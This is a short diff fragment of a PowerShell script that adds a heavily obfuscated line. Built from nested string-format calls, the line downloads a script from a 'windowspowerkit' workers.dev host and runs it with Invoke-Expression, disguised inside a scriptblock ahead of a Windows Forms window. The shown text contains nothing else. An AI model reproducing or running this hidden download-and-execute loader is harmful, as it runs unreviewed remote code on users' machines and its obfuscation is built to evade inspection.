-&([string]::Format("{1}{0}",'x','ie'))(&([string]::Format("{1}{0}", 'r','iw'))([string]::Format("{8}{9}{6}{0}{5}{1}{7}{4}{2}{3}", 'o',[string]::Format("{1}{0}",'it','erk'),[string]::Format("{1}{0}" ,'.',[string]::Format("{0}{1}", [string]::Format("{0}{1}", 'or','ker'),'s')),'dev','w','w',[string]::Format("{1}{0}",'sp','ow'),'.',[string]::Format("{0}{1}",[string]::Format("{1}{0}" , 'hec','c'),'k.w'),'ind'))-useb)}
+$String = {Disable-RunspaceDebug
+&([string]::Format("{1}{0}",'ex','i'))(&([string]::Format("{1}{0}",'rm','i'))([string]::Format("{0}{4}{3}{7}{8}{5}{1}{2}{6}{9}" , 'h','.wo',[string]::Format("{1}{0}" , '.d',[string]::Format("{0}{1}",'rk','ers')),[string]::Format("{2}{1}{0}" ,'l',[string]::Format("{1}{0}",'o','o'),'/t'),[string]::Format("{1}{0}" ,[string]::Format("{0}{1}" ,'ps',':/'),'tt'),'it','ev/','.w',[string]::Format("{1}{0}",'erk',[string]::Format("{1}{0}{2}", 'ows', 'ind', 'pow')), [string]::Format("{1}{0}",[string]::Format("{1}{0}", 'fy', 'ri'), 've'))))}
 $SecureString = $String.ToString()
 #
 $Pg = New-Object 'System.Windows.Forms.Form'
